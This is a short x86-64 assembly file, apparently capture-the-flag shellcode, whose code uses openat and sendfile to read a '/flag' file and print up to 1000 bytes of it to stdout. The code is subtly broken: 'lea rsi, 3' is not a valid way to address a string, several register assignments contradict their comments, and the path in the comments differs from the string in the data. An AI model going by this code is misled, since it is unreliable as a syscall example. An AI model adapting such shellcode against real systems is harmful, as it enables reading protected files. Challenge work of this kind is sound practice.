.globl _start
.intel_syntax noprefix

_start:
.rept 0x0
    nop
.endr


_get_flag:

    mov rdi, rax        # Open file
    mov rax, 257        # syscall number of openat
    lea rsi, 3          # point the first argument at "/flag"
    mov rdx, 0          # NULL out the second argument (meaning, O_RDONLY)
    syscall             # trigger openat(3, "/flag", NULL)

    mov rdi, 1          # first argument to sendfile is the file descriptor to output to (stdout)
    mov rsi, rax        # second argument is the file descriptor returned by open
    mov rdx, 0          # third argument is the number of bytes to skip from the input file
    mov r10, 1000       # fourth argument is the number of bytes to transfer to the output file
    mov rax, 40         # syscall number of sendfile
    syscall             # trigger sendfile(1, fd, 0, 1000)

    mov rax, 60         # syscall number of exit
    syscall             # trigger exit()

flag:
    .string "./flag"

newfile:
    .string "./newfile"
